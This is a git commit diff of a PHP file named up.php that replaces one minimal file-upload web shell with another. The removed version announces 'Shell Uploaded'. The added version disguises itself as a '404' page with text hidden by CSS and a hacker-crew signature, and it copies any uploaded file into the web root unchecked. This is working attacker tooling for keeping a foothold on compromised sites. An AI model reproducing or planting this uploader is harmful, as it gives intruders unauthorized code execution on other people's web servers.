05be04ee5cc1c5ed9677f58c6e422058eaef819d
Jenderal92 <59664965+Jenderal92@users.noreply.github.com>
2020-04-15 19:13:26 +0700

    Update up.php

--- up.php
+++ up.php
@@ -1,9 +1,4 @@
-<title>Vuln!! patch it Now!</title>
-<?php
-echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
-if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
-else { echo '<b>Not uploaded ! </b><br><br>'; }
-}
-?>
+<img class=" height="200" src="https://i.ibb.co/64PG4Zp/images.png"/><title>404</title>
+<font face="Courier new" color="black" size="6">| _ByME - Jenderal92 - Ajibarang1337 |</font>
+<style>body{font-size: 0;}h1{font-size: 12px}</style>
+<h1><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>BERHASIL NGNTD:V</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>GAGAL BNGSD"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=BAKUHANTAMCREW> <br>"; }__halt_compiler();?></h1>
